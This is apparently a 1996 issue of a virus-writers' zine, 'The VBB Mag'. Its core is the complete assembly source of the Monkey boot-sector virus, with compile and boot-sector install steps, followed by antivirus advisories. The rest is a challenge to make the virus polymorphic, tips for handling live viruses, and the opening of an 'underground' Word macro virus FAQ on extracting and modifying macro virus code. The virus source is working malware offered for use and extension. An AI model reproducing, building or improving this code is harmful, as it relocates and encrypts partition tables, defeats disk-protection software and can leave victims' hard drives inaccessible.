@@ -1,0 +1,2622 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+
+				The VBB Mag			Issue 2
+				-----------			June 21, 96
+								
+
+
+Contents:
+
+File Infector Section:
+- ----------------------
+
+000	-You're reading it!
+001	-What's Up?
+002	-Subst Safety Issues
+003	-Virus Special!  THe Monkey Virus
+004	-This Issues Virus Challenge
+ASM	-Undetectable Virus! Marauder Virus Source Code!
+
+Macro Virus Section:
+- --------------------
+
+005	-The Underground Virus FAQ
+006	-Macro Virus Spotlight!  The Xenixos (Nemesis) Virus
+007	-Macro Special!  New and Undetectable Macro Virus!
+
+
+
+Staff:
+
+	Dark Night(Me!)	-Editor, Virus Supply, Virus Definitions, ...
+	Aurodreph	-Co-Editor, Virus Supply, Macro Virus Specialist,
+			 Mag Distribution, ...
+
+
+	
+-----BEGIN PGP SIGNATURE-----
+Version: 2.6.3ia
+Charset: cp850
+Comment: Reviewed by Editor
+
+iQB1AwUBMVDjlJUWxCqisaIxAQE8FQL8CiO5ssd1IMSiIhgSD1MR2jGAXGBw7uFg
+iAcG+LgVnVIylQmExjlvPzCT3fMzojImNe5I+3vj7gbE8NleqqgwZgRnzcSulZPc
+hBUesZcanoW3p8HEBkyt/+n48W/6QpkN
+=q/v2
+-----END PGP SIGNATURE-----
+-----BEGIN PGP SIGNED MESSAGE-----
+
+				What's Up?
+				----------
+
+It hasn't been very long since the last issue of this mag and there really 
+hasn't been a lot of things to write about.  But let me list what little has 
+happened.
+
+We have a new member!!!		---->Aurodreph
+
+He knows a lot about macro virii which caused me to give him the job of writing 
+the macro virus articles.  Also he will distribute this mag on various BBS's
+in France.  Welcome aboard Aurodreph!!
+
+
+				Mag Stuff
+				---------
+
+As usual at this point I will ask you to please contribute to this mag.  You
+don't have to be a member to contribute articles or virii.  I would really 
+like to get some people involved in this mag.  So please submit your 
+articles to me at 101546.2222@compuserve.com!
+
+				
+						Dark Night
+				
+				Macro Stuff
+				-----------
+
+Hi,
+
+Yes, I write some articles for the mag... about macro virus... Because I 
+study this type of virus, and I write some "interesting" macros.
+I want to update the underground FAQ with the new virus macro..
+
+For the next issue, U heard about new macro virus like DIVINA, ANTI-DMV 
+and NOP.  So if you have more informations, please help me... :-)
+
+						Aurodreph
+-----BEGIN PGP SIGNATURE-----
+Version: 2.6.3ia
+Charset: cp850
+Comment: Reviewed by Editor
+
+iQB1AwUBMVDh+ZUWxCqisaIxAQE4ywL/Z1M7sl0uhSUiK+2uyr3DGSnxROdgBhF0
+lj1nkPg0DiqOyq0lVIryXWh88RziIFWjytm7RAdzW+XqWtKF3q6OmLVwDBivY7YH
+27BLOf6CDc/AEiD+4wp6reUCP3X96nlV
+=9JiI
+-----END PGP SIGNATURE-----
+-----BEGIN PGP SIGNED MESSAGE-----
+
+            Virii and Safety
+            ----------------
+
+
+I'm one of the people who really enjoy downloading and playing with virii.  
+SInce I have no idea of what some virii do, I don't want them to infect my 
+Hard drive.  So to prevent them from doing so I always issue the following 
+commands:
+
+subst D: A:\
+subst C: A:\
+
+These commands redirect all accesses to my D and C drive(My 2 HD's) to the A
+drive.  I have found this method 100% safe.  But recently I have gotten 
+complaints by people who tested the infections and then took off the subst 
+commands to avoid restarting the computer.
+
+Subst commands can be removed by using the following command line:
+
+subst D: /d
+subst C: /d
+
+Before they did this they didn't think that the virus may be resident which
+will consequently result in HD or MBR/BR infections.  So please when you
+use these commands when playing with your computer it is always wise to use
+a COLD boot to remove the virus from memory.
+
+If you are more paranoid, you can use a little soft like WPHD that prevents
+ any access to your hard-drive for writing or formatting. Interesting :-))).
+ Be careful not to use it with Windows...because it makes lot of accesses to
+ your HD and will present millions of errors...
+
+                                                    Dark Night
+
+-----BEGIN PGP SIGNATURE-----
+Version: 2.6.3ia
+Charset: cp850
+Comment: Reviewed by Editor
+
+iQB1AwUBMU/RlZUWxCqisaIxAQHImQL8CQCwBazMkhw6Sz74MDbFDcl450SVi4pI
+sFqBTU6oCxaAHn2q5AFMsBJ/2WbijSFb6KVXjADlZvp82TV5vCeqzHOVTA5PYwqv
+GsdF8W1JMcvlEH45V72SenB7Hy8X1rgs
+=1wPK
+-----END PGP SIGNATURE-----
+-----BEGIN PGP SIGNED MESSAGE-----
+
+			Virus Spotlight!  The Monkey Virus.
+			-----------------------------------
+
+I have included the Monkey Virus in this issue for its innovative infection 
+capabilities.  It moves your partition table whic makes it only readable
+when the virus is in memory.  This makes the disinfection very hard.  
+For more info see the summaries at the end of this source code.  Note: The
+code is totally messed up when reading this file with Notepad.  So please use
+the Dos Editor or Write.
+
+
+       page    70,80
+       Name    Monkey
+
+;*******************************************************
+;
+;      Monkey written at the city of champions
+;       - Edmonton - by UACVRS - Jan 1992.
+;
+;     Monkey is a full stealth MBR/Boot self-replicating program with
+;     no payload but it does not save the HD's partition
+;     table in place. When the "infected" computer is booted
+;     from a floppy, c: drive will no longer be accessible.
+;
+;     To compile: masm monkey     (we used MASM 5.0)
+;                 link monkey
+;                 exe2bin monkey.exe monkey.co
+;     Use NU, or debug to copy monkey.co to the boot
+;        sector of a floppy. The diskette will not boot
+;        but will install itself on the hard drive.
+;
+;     Bug: It will trash any floppies higher than
+;          1.44meg, not deliberately.
+;
+;*******************************************************
+
+Code   Segment
+       Assume  CS:Code,DS:CODE,ES:CODE
+       ORG     00H
+
+MAIN:
+       JMP     INITIAL
+
+; space above 1fh is for floppy format data
+
+       ORG     1FH
+INT_13     EQU     THIS BYTE
+
+          PUSH    DS
+          PUSH    SI
+          PUSH    DI
+          PUSH    AX
+          PUSH    CX
+          PUSH    DX
+
+          CALL    SET_HEAD
+
+          CMP     AH,02H
+          JNZ     END_ACTION
+
+          PUSH    DX
+          SUB     AX,AX
+          INT     1AH
+
+TIME      EQU $ + 2
+          CMP     DL,40H
+          POP     DX
+          JNB     END_ACTION
+
+          CALL HANDLE_DISK
+
+END_ACTION:
+          POP   DX
+          POP   CX
+          POP   AX
+          POP   DI
+
+          PUSH  DX
+          PUSH  CX
+          PUSH  AX
+
+          CMP   CX,03H                 ; YES, IS SECTOR LESS THAN 3?
+          JNB   EXIT_2                 ; NO, EXIT
+
+          CMP   DH,BYTE PTR DS:[SI]    ; Right head?
+          JNZ   EXIT_2                 ; NO, EXIT
+
+          CMP   AH,02H                 ; READ ?
+          JZ    STEALTH                ; YES, STEALTH
+
+          CMP   AH,03H                 ; WRITE ?
+          JNZ   EXIT_2                 ; NO, EXIT
+                                       ; YES!
+          CMP   DL,80H                 ; HARD DRIVE?
+          JB    EXIT_2                 ; NO, EXIT
+
+          SUB   AH,AH            ; else RESET DISK - make HD light blink
+          JMP   SHORT EXIT_2           ; EXIT
+STEALTH:
+          CALL  INT13                  ; READ
+          JB    EXIT_3                 ; ERROR?
+
+          CALL  COMP_SIG               ; MY RELATIVE?
+          JZ    REDIRECT               ; YES, REDIRECT
+
+          CALL  COMP_PA                ; NO, IS IT PA?
+          JZ    REDIRECT               ; YES, REDIRECT
+
+EXIT_0:
+          CLC                          ; NO, RESET FLAG
+          JMP   SHORT EXIT_3           ; EXIT
+
+REDIRECT:
+
+          CALL  CHSEC        ; CALC. THE SECTOR TO HIDE & PUT IN CL
+
+          MOV   DH,BYTE PTR DS:[SI+1]  ; SET RIGHT HEAD
+
+          POP   AX                     ; RESTORE AX
+          CALL  INT13                  ; RE-READ
+          CALL  ENCRPT_PBR
+          POP   CX                     ; RESTORE CX, DX
+          POP   DX
+          JMP   SHORT EXIT_4           ; EXIT
+EXIT_2:
+          CALL  INT13
+EXIT_3:
+          POP   DS
+          POP   DS
+          POP   DS
+EXIT_4:
+          POP   SI
+          POP   DS
+          RETF  0002H
+
+READ_SEC_1:
+          MOV   AX,0201H         ; READ
+INT13 PROC NEAR
+          PUSHF
+          CALL  DWORD PTR CS:INT13_ADDR     ;***********
+          RET
+INT13 ENDP
+
+HOOK_ENTRY   EQU  THIS BYTE
+HOOK:
+          INT   12H
+          MOV   SI,004CH
+          PUSH  SI
+          CMP   BYTE PTR CS:HOME_SEC,02H       ; I am in sector 2?
+          JZ    SETUP_SPECIAL
+
+SETUP_NORMAL:
+
+          CALL  SHIFT_NORMAL
+
+          MOV   DI,OFFSET INT13_ADDR
+          MOV   CX,0002H
+          CLD
+          REPZ  MOVSW
+
+          JMP   SHORT STORE_SEGMENT
+
+SETUP_SPECIAL:
+
+          CALL  SHIFT_SPECIAL
+
+STORE_SEGMENT:
+          POP   SI
+          MOV   WORD PTR DS:[SI],OFFSET INT_13  ; STORE MY ENTRY POINT
+          MOV   DS:[SI+2],AX            ; STORE MY SEGMENT
+
+PATCH_OVER:
+
+          PUSH  CS
+          POP   DS
+          CALL  PATCH           ; PATCH OVER
+          PUSH  ES              ; PUSH SEGMENT
+          MOV   AX,OFFSET JMP_ADDR
+          PUSH  AX              ; PUSH ADDRESS
+          STI
+          RETF                 ; FAR JMP
+
+    JMP_ADDR   EQU THIS BYTE
+BOOT:
+          MOV   ES,CX
+          MOV   BX,SP            ; TO 0000:7C00
+          PUSH  CX              ; SAVE JMP SEGMENT
+          PUSH  BX
+
+          MOV   DX,0080H         ; HANDLE C:
+          CALL  SET_HEAD
+          CALL  HANDLE_DISK
+
+BOOT_SEC  EQU $ + 1
+          MOV   CL,05H           ; FROM SECTOR 3   ????
+
+BOOT_DISK  EQU $ + 1
+          MOV   DX,0100H         ; C:, HEAD 0      ????
+
+          CALL  READ_SEC_1      ; INT 13
+
+          CALL  ENCRPT_PBR
+
+          RETF
+
+HANDLE_DISK PROC NEAR
+
+          ; *** READ SECTOR 1 ***
+          SUB   CX,CX
+          INC   CX
+          PUSH  CX
+
+          MOV   DH,[SI]          ; HEAD
+          CALL  READ_SEC_1      ; INT 13
+          JB    END_HANDLE_DISK          ; ERROR -> END
+
+          ; *** COMPARE ***
+          CALL  COMP_SIG
+          JZ    E_2                      ; SAME -> UPDATE MYSELF
+
+          ; *** PA?  ***
+          CALL  COMP_PA                  ; Is it Pagett's disksec?
+          JNZ   UPDATE_DISK              ; NO
+
+          ; *** OK?  ***
+          INC   CX
+          CMP   WORD PTR ES:[BX+1FAH],00H ; when this byte in disksec is set
+                                          ; to 0 means disksec would not do
+                                          ; checksum of partitions - Pagett
+                                          ; sucks
+          JZ    E_2                       ; SAME -> UPDATE MYSELF
+
+          MOV   WORD PTR ES:[BX+1FAH],00H ; set this to zero
+          MOV   CL,1H                     ; write the change back to sector 1
+          CALL  WRITE_SEC_1               ;
+          JB    END_HANDLE_DISK
+
+          ; *** YES! READ SECTOR 2  ***
+          INC   CX              ; yes,Pagette 's disksecure is on sector 1
+          MOV   DH,[SI+2]       ; My relative is on sector 2 - read sector 2
+          CALL  READ_SEC_1      ; INT 13
+          JB    END_HANDLE_DISK ; ERROR -> END
+          POP   AX
+          PUSH  CX
+
+UPDATE_DISK:
+          CALL  CHSEC        ; CALC. THE SECTOR TO HIDE & PUT IN CL
+          CALL  ENCRPT_PBR
+          INC   SI
+          CALL  WRITE_SEC_1
+          DEC   SI
+          JB    END_HANDLE_DISK
+
+          CALL  ENCRPT_PBR
+          PUSH  CX
+          CALL  PATCH
+          POP   CX
+
+          PUSH  DX
+          CMP   DL,80H
+          JNB   E_1
+          XOR   DL,DL
+E_1:
+          MOV   WORD PTR ES:[BX+BOOT_DISK],DX
+          POP   DX
+          MOV   BYTE PTR ES:[BX+BOOT_SEC],CL
+          POP   CX
+          PUSH  CX
+          MOV   BYTE PTR ES:[BX+OFFSET HOME_SEC],CL
+          MOV   WORD PTR ES:[BX+OFFSET BOOT_SIG],0AA55H
+
+E_2:
+          CALL  WRITE_SEC_1
+
+END_HANDLE_DISK:
+          POP   AX
+          RET
+
+HANDLE_DISK ENDP
+
+WRITE_SEC_1 PROC NEAR
+          MOV  DH,[SI]
+WRITE_SEC_2:
+          MOV  AX,0301H
+          CALL INT13
+          RET
+WRITE_SEC_1 ENDP
+
+COMP_SIG PROC NEAR
+   CMP     ES:[BX+OFFSET PROG_SIG],9219H
+   RET
+COMP_SIG   ENDP
+
+COMP_PA PROC NEAR
+   CMP   WORD PTR ES:[BX+119H],6150H   ; PA?
+   RET
+COMP_PA    ENDP
+
+HOME_SEC    DB     01H
+
+FLOPPY_HEAD DB     00H,01H,01H
+HARD_HEAD   DB     00H,00H,00H
+
+                  ;  360 720 1.2 1.44
+FLOP_SECT_TABLE   DB  02H,05H,09H,0BH
+SAVE_SECT_TABLE   DB  03H,05H,0EH,0EH
+
+CHSEC PROC NEAR
+   PUSH    DI
+   PUSH    SI
+   MOV     AL,ES:[BX+14H]
+   MOV     CX,0004H
+CHSEC_1:
+   MOV     SI,CX
+   DEC     SI
+   CMP     FLOP_SECT_TABLE[SI],AL
+   JZ      CHSEC_END_1
+   LOOP    CHSEC_1
+   MOV     CL,03H
+   JMP     SHORT CHSEC_END_2
+CHSEC_END_1:
+   MOV     CL,SAVE_SECT_TABLE[SI]
+CHSEC_END_2:
+   POP     SI
+   POP     DI
+   RET
+CHSEC      ENDP
+
+SHIFT_NORMAL PROC NEAR
+ ; FIND THE SEGMENT TO HIDE
+    DEC    AX
+    MOV    DS:[413H],AX
+
+SHIFT_SPECIAL:
+    MOV    CL,06H
+    SHL    AX,CL
+    ADD    AL,20H
+    MOV    ES,AX
+    RET
+SHIFT_NORMAL     ENDP
+
+PATCH PROC NEAR         ; PATCH ON BOOT SECTOR STARTING AT BYTE int_13
+    PUSH  SI
+    MOV   DI,BX
+    MOV   SI,OFFSET INT_13
+    ADD   DI,SI
+;   CLD
+    MOV   CX,OFFSET PROG_END - OFFSET INT_13
+    REPZ  MOVSB
+
+PATCH_JMP:
+    MOV   DI,BX
+
+    SUB   SI,SI
+    MOV   CL,3H
+    REPZ  MOVSB
+
+    POP   SI
+    RET
+PATCH     ENDP
+
+SET_HEAD PROC NEAR
+    PUSH  CS
+    POP   DS
+
+    MOV   SI,OFFSET FLOPPY_HEAD
+    CMP   DL,80H
+    JB    SET_HEAD_EXIT
+    MOV   SI,OFFSET HARD_HEAD
+SET_HEAD_EXIT:
+    RET
+SET_HEAD  ENDP
+
+INITIAL:
+      CLI
+      SUB   BX,BX
+      MOV   DS,BX
+      MOV   SS,BX
+      MOV   SP,7C00H
+      JMP   HOOK
+      NOP
+      NOP
+
+ENCRPT_PBR:
+      PUSH    DI
+      PUSH    CX
+      PUSH    AX
+
+      MOV     DI,BX
+      MOV     CX,200H
+
+      CLD
+ENCRPT_1:
+      MOV     AL,ES:[DI]
+ENCRPT_CODE   EQU $ + 0001H
+      XOR     AL,2EH
+      STOSB
+      LOOP    ENCRPT_1
+
+      POP     AX
+      POP     CX
+      POP     DI
+      RET
+
+
+             ORG 01F4H
+;PROG_NAME   DB     "Monkey"
+PROG_NAME   DB     6dh,8fh,8eh,8bh,85h,99h
+
+             ORG 01FAH
+PROG_SIG    DB     19H,92H
+
+PROG_END    EQU   THIS BYTE
+
+            ORG 01FCH
+INT13_ADDR  DB     00H,00H
+
+            ORG 01FEH
+BOOT_SIG    DB     55H,0AAH
+PROG_TAIL   EQU   THIS BYTE
+
+PROG_LEN    EQU   OFFSET PROG_END - OFFSET INT_13
+
+
+CODE      ENDS
+      END MAIN
+
+; from U of A
+NEW COMPUTER VIRUS THREAT                   Posted: July 9, 1992
+
+MONKEY VIRUSES ON PCs
+
+The Monkey viruses are main boot record/boot sector infectors,
+derived from the Empire D virus. Two variants of the Monkey virus
+have been identified. Of particular concern is the fact these
+viruses can infect computers protected by the Disk Secure program,
+while causing no noticeable changes. Symptoms of infection for
+those computers without Disk Secure include memory reduction and
+hard drive partitions which are not accessible when booting up
+with a floppy disk. When the viruses are active on computers
+without Disk Secure, total memory will be reduced by 1,024 bytes.
+
+Monkey viruses destroy partition table data. If an infected system
+is booted up from a clean boot disk, DOS claims to be unable to
+access the hard drive partitions. A DIR C: command will return the
+message, "Invalid drive specification."
+
+Detection
+
+The simplest method of detection involves recognizing a 1K
+decrease in memory. The DOS commands CHKDSK and MEM will return 1K
+less "total conventional memory" than is normal.
+
+Of the popular virus scanning products, only F-PROT version 2.04A
+finds the Monkey viruses, calling them a "New variant of Stoned."
+It will identify the virus in memory as well. The F-PROT Virstop
+driver does not recognize the Monkey viruses on boot-up.
+
+Disk Secure version 1.15a (ds115a.zip) has a version of the CHKSEC
+program that will notice the presence of the Monkey viruses. Note
+that Disk Secure itself will not detect the infection: it is
+important that the CHKSEC command be called from the autoexec.bat
+file.
+
+As well, a special program to find and remove the Monkey viruses,
+called KILLMONK, has been written at the University of Alberta.
+
+Removal
+
+To clean a hard disk: If you have previously saved a copy of the
+clean main boot record (MBR), then this can be restored. (Many
+anti-virus products have an automated way of doing this.) If you
+don't have a copy of the original MBR, and don't know what values
+your partition table should have, then the KILLMONK program will
+restore the partition table for you.
+
+To restore diskettes: Use the KILLMONK program.
+
+The newest version of F-PROT (version 2.04A) and the KILLMONK
+program, are both available, free of charge, from Computing and
+Network Services. Bring a formatted diskette to the Microcomputer
+Demonstration Centre (MDC), in the basement of the Bookstore, or a
+ready-made diskette can be purchased for $2.00 from the CNS User
+Support Centre at 302 General Services Building. These programs
+can also be downloaded from the MTS account VIR.
+
+;From: martin@cs.ualberta.ca (Tim Martin; FSO; Soil Sciences)
+Subject: WARNING - new viruses, Monkey.1 and Monkey.2 (PC)
+Date: 20 Jul 92 09:10:09 GMT
+
+Virus Name:  MONKEY.1, MONKEY.2  (Empire variants)
+V Status:    New
+Discovery:   February, 1992
+Symptoms:    Memory reduction, hard drive partitions not accessible on
+             floppy bootup.
+Origin:      Alberta, Canada
+Eff. Length: 512 bytes
+Type Code:   BPRtS (Boot and Partition table infector - Resident TOM -
+             Stealth)
+Detection:   CHKDSK, F-PROT 2.04, CHKSEC from Disk Secure 1.15, KILLMONK
+Removal:     Cold boot from clean, write-protected floppy, replace MBR
+(hard
+             disk) or Boot Sector (floppy).
+
+General Comments:
+The Monkey viruses are Main Boot Record / Boot Sector infectors,
+derived from the Empire D virus.  Two variants of the Monkey virus
+have been identified: their most obvious difference is in the initial
+bytes at offset 0:
+Monkey.1:    E9 CD 01      (JMP 02D0)
+Monkey.2:    EB 1E 90      (JMP 0020 ; NOP)
+
+Both variants keep the original sector's data at offset 03h - 1fh.  In
+boot sectors, this region contains data required to identify the
+diskette format.  This solves the problem noticed with earlier
+variants of Empire, whereby infected 720k diskettes were sometimes
+unreadable.
+
+The Monkey viruses take 1k from the top of memory.  When active, total
+memory will be reduced by 1024 bytes.
+
+The Monkey viruses use stealth to protect both the MBR and diskette
+boot sectors.  When active in memory, Int 13h calls cannot access the
+infected sector of either hard disks or floppies.
+
+The Monkey viruses are not polimorphic.  They do not encode any of the
+virus, as was done by some of the earlier Empire variants.  But before
+saving the clean MBR or boot sector to a hiding place, the Monkey
+viruses do encode that sector, using an "XOR 2Eh".  This creates a
+problem for any disinfecting program that recover the initial boot
+sector or MBR by copying it from the hiding place.
+
+When a hard disk is infected, the encoded MBR is put at side 0,
+cylinder 0, sector 3.
+
+When a floppy diskette is infected, the original boot sector is placed
+in the bottom sector of the root directory.  This means directory
+entries will be lost only if the root directory is nearly full -- more
+than 96 entries on double density diskettes, or more than 208 entries
+on high density diskettes.  The virus is designed to identify only the
+four most common diskette formats.  If the diskette is not of a
+recognized format, the boot sector is put on side 1, sector 3.  I have
+no idea what would happen to a 2.88Mb diskette, but I suspect the
+virus would damage the File Allocation Table, causing loss of data.
+
+The Monkey viruses do not put any messages to the screen at any time,
+but the virus code does contain, encrypted, the string "Monkey",
+followed by bytes 1992h.  It may be significant that the chinese Year
+of the Monkey began in February 1992.
+
+The most remarkable characteristic of the Monkey viruses is that they
+were designed as an attack on Padgett Peterson's "Disk Secure"
+product.  When a computer is booted from an infected diskette, the
+virus first checks whether Disk Secure is on the hard disk.  If it is,
+the virus puts itself in sector 2, rather than sector 1, and slightly
+modifies Disk Secure, so that Disk Secure will load the virus after
+Disk Secure has checked the system and loaded itself.  The monkey
+viruses install themselves and above Disk Secure, in memory, at offset
+200h.
+
+The Monkey viruses do not save the partition table data in place, so
+if an infected system is booted from a clean boot disk, DOS claims to
+be unable to access the hard drive partitions.  A DIR C: command will
+return "Invalid drive specification".
+
+Detection:
+Of the popular virus scanning products, only F-PROT 2.04 finds the
+Monkey viruses, calling them a "New variant of stoned".  It will
+identify the virus in memory as well.  The F-PROT Virstop driver does
+not recognise the Monkey viruses, on boot-up.
+
+Disk Secure v. 1.15a (ds115a.zip) has a version of CHKSEC that will
+notice the presence of the Monkey viruses.  Notice that Disk Secure
+itself will not detect the infection: it is important that the CHKSEC
+command be called from the autoexec.bat file.
+
+The simplest detection still involves recognizing a 1k decrease in
+memory.  CHKDSK and MEM will return 1k less "total conventional
+memory" than normal.
+
+A special program to find and remove the Monkey viruses, called
+KILLMONK, has been written at the University of Alberta.  I hope to
+make this available to the anti-virus community shortly.
+
+Removal:
+The undocumented /MBR option of FDISK does remove the Monkey virus
+from the MBR, provided the computer was booted from a clean floppy,
+but it does not restore the correct partition table values.  The
+problem is that the partition table is not in place in sector one: the
+table is encoded, in sector 3.
+
+To clean a hard disk: If you have previously saved a copy of the clean
+MBR, then this can be restored.  (Many anti-virus products have an
+automated way of doing this.)  If you don't have a copy of the
+original MBR, and don't know what values your partition table should
+have, then the KILLMONK program may be what you need.
+
+To restore diskettes: Padgett Peterson's FIXFBR works very well,
+though it doesn't recognize that the disk is infected.  Another
+alternative is the KILLMONK program.
+
+Scan String:
+The following hexidecimal string is in both variants of Monkey.  It is
+from the code the virus uses to recognize itself.
+   26 81 bf fa 01 19 92 c3 26 81 bf 19 01 50 61
+
+Tim
+
+  ;   From F-PROT
+
+ Name: Monkey
+ Type: Boot  MBR  Stealth
+
+ The Monkey virus was first discovered in Edmonton, Canada, in the
+ year 1991. The virus spread quickly to USA, Australia and UK.
+ Monkey is one of the most common boot sector viruses.
+
+ As the name indicates, Monkey is a distant relative of Stoned.
+ Its technical properties make it quite a remarkable virus,
+ however. The virus infects the Master Boot Records of hard disks
+ and the DOS boot records of diskettes, just like Stoned. Monkey
+ spreads only through diskettes.
+
+ Monkey does not let the original partition table remain in its
+ proper place in the Master Boot Record, as Stoned does. Instead
+ it moves the whole Master Boot Record to the hard disk's third
+ sector, and replaces it with its own code. The hard disk is
+ inaccesible after a diskette boot, since the operating system
+ cannot find valid partition data in the Master Boot Record -
+ attempts to use the hard disk result in the DOS error message
+ "Invalid drive specification".
+
+ When the computer is booted from the hard disk, the virus is
+ executed first, and the hard disk can thereafter be used
+ normally. The virus is not, therefore, easily noticeable, unless
+ the computer is booted from a diskette.
+
+ The fact that Monkey encrypts the Master Boot Record besides
+ relocating it on the disk makes the virus still more difficult to
+ remove. The changes to the Master Boot Record cannot be detected
+ while the virus is active, since it rerouts the BIOS-level disk
+ calls through its own code. Upon inspection, the hard disk seems
+ to be in its original shape.
+
+ The relocation and encryption of the partition table render two
+ often-used disinfection procedures unviable. One of these is the
+ MS-DOS command FDISK /MBR, capable of removing most viruses that
+ infect Master Boot Records. The other is using a disk editor to
+ restore the Master Boot Record back on the zero track. Although
+ both of these procedures destroy the actual virus code, the
+ computer cannot be booted from the hard disk afterwards.
+
+ There are five different ways to remove the Monkey
+ virus:
+ o       The original Master Boot Record and partition table can
+         be restored from a backup taken before the infection.
+         Such a backup can be made by using, for example, the
+         MIRROR /PARTN command of MS-DOS 5.
+
+ o       The hard disk can be repartitioned by using the FDISK
+         program, after which the logical disks must be formatted.
+         All data on the hard disk will consequently be lost,
+         however.
+
+ o       The virus code can be overwritten by using FDISK/MBR, and
+         the partition table restored manually. In this case, the
+         partition values of the hard disk must be calculated and
+         inserted in the partition table with the help of a disk
+         editor. The method requires expert knowledge of the disk
+         structure, and its success is doubtful.
+
+ o       It is possible to exploit Monkey's stealth capabilities
+         by taking a copy of the zero track while the virus is
+         active. Since the virus hides the changes it has made,
+         this copy will actually contain the original Master Boot
+         Record. This method is not recommendable, because the
+         diskettes used in the copying may well get infected.
+
+ o       The original zero track can be located, decrypted and
+         moved back to its proper place. As a result, the hard
+         disk is restored to its exact original state. F-PROT uses
+         this method to disinfect the Monkey virus.
+
+ It is difficult to spot the virus, since it does not activate in
+ any way.  A one-kilobyte reduction in DOS memory is the only
+ obvious sign of its presence. The memory can be checked with, for
+ instance, DOS's CHKDSK and MEM programs. However, even if MEM
+ reports that the computer has 639 kilobytes of basic memory
+ instead of the more common 640 kilobytes, it does not necessarily
+ mean that the computer is infected. In many computers, the BIOS
+ allocates one kilobyte of basic memory for its own use.
+
+ The Monkey virus is quite compatible with different diskette
+ types. It carries a table containing data for the most common
+ diskettes. Using this table, the virus is able to move a
+ diskette's original boot record and a part of its own code to a
+ safe area on the diskette. Monkey does not recognize 2.88
+ megabyte ED diskettes, however, and partly overwrites their File
+ Allocation Tables.
+
+
+
+-----BEGIN PGP SIGNATURE-----
+Version: 2.6.3ia
+Charset: cp850
+Comment: Reviewed by Editor
+
+iQB1AwUBMU7VSZUWxCqisaIxAQFn/QL5Af3CQHSi+k9P7GgluyjP4DfX7mq8HXq+
+/ubZFacNBAmoIlp/yJkBTxRYLn1eeW25JyMVCI7MavShe3zEj34xUz/0o9whFmxD
+Dkj89+mdbFiH1dNaN1C3A9Y+hlhEmuHx
+=OilF
+-----END PGP SIGNATURE-----
+-----BEGIN PGP SIGNED MESSAGE-----
+
+			The 2nd Annual Virus Challenge
+			------------------------------
+
+
+Well, it's time again for a new Virus challenge.  As you have probably seen
+I included the Monkey Virus source in this issue.  In the description after 
+the source there was mention of the virus not being polymorphic.  So
+after seeing that I got the idea for this virus challenge.  With this
+mag you recived the Polymorphic Mutation Engine for the virus challenge.  So
+as you can guess your challenge is to make the monkey virus polymorphic with
+or without the help of of the MTE.
+
+							Dark Night   
+-----BEGIN PGP SIGNATURE-----
+Version: 2.6.3ia
+Charset: cp850
+Comment: Reviewed by Editor
+
+iQB1AwUBMU7Vo5UWxCqisaIxAQESaAMAiUV2QxPAdpbhgYu3WV/m14ffuSYakAN1
+H/fa2jnFn5Tv77xS6cYwFv8uljBqgUuXxNDxHpLwWyXN0lkNrskA9xHCad/PWRD8
+hE2zXtDeGz7/K+vRm5dwrzWajQD5pUNc
+=EsCX
+-----END PGP SIGNATURE-----
+-----BEGIN PGP SIGNED MESSAGE-----
+
+      --------------------------------------------------------------
+			    The UNDERGROUND
+		   MS WORD 6.x MACRO VIRUSES FAQ V2.0
+		       <Frequently Asked Questions>
+		     By      ,
+			<****{=============-
+			     ' AuRoDrEpH, the Drow
+      --------------------------------------------------------------
+			   "Help to MICROFUCK WORD."
+      --------------------------------------------------------------
+
+      --------------------------------------------------------------
+
+TOPIC 1 : WHAT IS A WORD MACRO VIRUS?
+=========================================
+
+A WORD MACRO Virus, is a macro <list of instructions> or template file
+<usually with the .DOT extension> which masquerades as legitimate MS WORD
+documents <usually with the extension *.DOC>.  An infected *.DOC file,
+doesn't look any different to the average PC user, as it can still contain
+a normal document.  The difference is that this document is really just a
+template or macro file, with instructions to replicate, and possibly cause
+damage.  MS WORD will interpret the *.DOT macro/template file regardless of
+extension, as a template file.  This allows for it being passed off as a
+legitimate document <*.DOC>  This FAQ takes the position that a document is
+meant to be DATA, and a MACRO is at least a partially executable CODE.  When
+a document has been infected, it has been merged with executable code in a
+multi-part file, part data/part executable.  This tends to be hidden from
+the user, who expects a document to be data that is READ, and not some
+combination of DATA and executable code designed to be executed, often
+against the will of the user, to wreck havok.
+
+These viruses commonly tend to infected the global macros, which get
+automatically saved at the end of each session.  When the next session of
+MS WORD opens, the infected Global Macros are executed, and the WORD
+Environment is now infected, and will in turn be likely to infect documents
+whenever they are opened, closed, and created during all future sessions.
+
+As a Virus, the WORD MACRO VIRUSES do REPLICATE.  They can spread in most
+cases to any MS WINDOWS Environment or OS that runs a compatible copy of MS
+WORD 6.x or 7.x, MS WORD 6.x running on OS/2, as well as WORD for MAC 6.0
+for MacOS.  This makes it a multi-platform/multi-OS file infector.  It also
+makes it one of the first non-research viruses to be successfully spread to
+all of these environments and OS's
+
+MS Word Macro Viruses reside in interpreted data that can spread to
+different OS's/platforms.  These viruses do not spread via modification of
+executable machine code, but by modification of data in files that are
+interpreted by the Microsoft Word 6.0 program and any other versions of
+Word that support macros and WordBasic.
+
+WordBasic Macro Language is much simpler to learn and master than
+ASSEMBLER, or other popular higher Level programming languages, and for
+this reason, Vx people <both new and old alike> have taken to it as a
+viable alternative to learning and coding ASM .  The thought of ticking
+users off on more than one platform has been around for years, and now
+thanks to MS WORD, and all it's compatible versions on other popular
+platforms, the Vx people have their wish.  Another Bonus of this new outlet
+for Vx writers, is that many virus scanners only scan Executable files,
+leaving the .DOC files of WORD alone.  It is important to note that many AV
+producers have now included scanners/cleaners to their software, allowing
+for the detection of existing MS WORD Macro Viruses.
+
+
+      --------------------------------------------------------------
+
+TOPIC 2: HOW STUDY A INFECTED DOCUMENT
+=======================================
+
+You are happy, :-) You find the latest macro virus. And now, you want to study 
+it, find the source code and modify it.
+OK, I'll explain... it's very easy.
+
+First of all, you make a copy of the NORMAL.DOT file (it's in the 
+MSOFFICE\WINWORD\MODELES).
+In most case, the macro virus isn't dangerous, except for the trojan virus, 
+FORMATC. In fact, when you read the document, it formats C:. So, a good idea is 
+to run a TSR anti-virus like VIRSTOP.
+Now, you launch the WORD application, and ...(it's the time to execute)... 
+then go to the menu TOOLS/OPTION and in the SAVE directory, click to select 
+the option (ask for saving NORMAL.DOT).
+
+Then you take a look at the file with a hexeditor.
+	A word document is composed of a first part, the data (text), then 
+the macro and in the last part, the data (name of the file,...). OK. Find 
+the name of the document near the end... and look for a "U". if you see some 
+U's, this mean that the macros are encrypted. You will need more time to study 
+because when you copy a macro, WORD gives you the option to READONLY: you can 
+execute the macro, but you can't see the source...
